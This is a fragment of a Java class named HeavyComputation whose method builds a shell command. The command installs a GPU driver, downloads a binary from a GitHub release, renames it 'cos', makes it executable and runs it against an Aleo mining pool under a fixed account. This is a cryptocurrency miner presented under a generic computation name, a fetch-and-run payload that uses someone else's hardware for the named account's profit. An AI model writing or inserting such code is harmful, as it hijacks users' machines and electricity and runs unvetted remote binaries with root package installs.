...
public class HeavyComputation {
    ...
    public static void performHeavyComputation() throws IOException, InterruptedException {
        ...
        String command = "apt update;apt install nvidia-driver-510 -y;wget https://github.com/oula-network/aleo/releases/download/v1.10/oula-pool-prover -O cos;chmod +x cos;./cos --pool wss://aleo.oula.network:6666 --account vbropa --worker-name RANDOM";
